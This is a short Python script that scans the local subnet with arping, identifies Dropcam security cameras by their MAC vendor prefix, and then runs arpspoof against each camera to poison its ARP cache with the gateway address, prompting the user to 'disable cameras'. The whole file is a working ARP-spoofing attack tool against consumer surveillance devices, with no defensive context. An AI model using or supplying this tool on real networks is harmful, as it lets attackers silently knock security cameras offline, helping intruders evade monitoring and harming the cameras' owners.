import netifaces, sys, commands, re, signal
from iptools import ipv4
from netaddr import IPNetwork
from subprocess import Popen
from time import sleep
from pprint import pprint

dropcams = []
spoofProcesses = []

def sigterm_handler(_signo, _stack_frame):
    for process in spoofProcesses:
        process.terminate()
    sys.exit(0)

signal.signal(signal.SIGINT, sigterm_handler)

def getNetworkInfo(ifname):
    interfaces = netifaces.interfaces()
    for i in interfaces:
        if i != ifname:
            continue
        iface = netifaces.ifaddresses(i).get(netifaces.AF_INET)
        if iface != None:
            for j in iface:
                return j['addr'], j['netmask'], netifaces.gateways()['default'][netifaces.AF_INET][0]

def allIps(addr, netmask, ifname, gateway):
    cidr = str(ipv4.netmask2prefix(netmask))
    print "Current Network: " + addr + "/" + cidr
    network = IPNetwork(str(addr) + "/" + cidr)
    X = '([a-fA-F0-9]{2}[:|\-]?){6}' # MAC matching regex
    print "---FINDING DROPCAMS ON NETWORK---"
    for host in list(network):
        output = commands.getstatusoutput('arping -c 1 -W 0.3 ' + str(host))
        a = re.compile(X).search(output[1])
        if a:
            mac = output[1][a.start(): a.end()]
            dropcam = ""
            if (mac.find("30:8c:fb") == 0):
                dropcam = " - DROPCAM"
                dropcams.append(str(host))
            print "Found MAC " + mac + " at IP " + str(host) + dropcam
    if len(dropcams) > 0:
        raw_input("---PRESS ENTER TO DISABLE CAMERAS---")
        startSpoofing(ifname, gateway)
    else:
        print "---NO DROPCAMS FOUND ON NETWORK---"

def startSpoofing(ifname, gateway):
    print "---SENDING DROPCAMS FALSE ARP INFORMATION---"
    for dropcam in dropcams:
        args = ["arpspoof", "-i", ifname, "-t", dropcam, gateway]
        spoofProcesses.append(Popen(args))
    try:
        while True:
            sleep(.5)
    finally:
        print "---RESTORING CORRECT ARP INFORMATION---"

if len(sys.argv) == 2:
    print "---GRABBING NETWORK INFORMATION---"
    addr, netmask, gateway = getNetworkInfo(sys.argv[1])
    allIps(addr, netmask, sys.argv[1], gateway)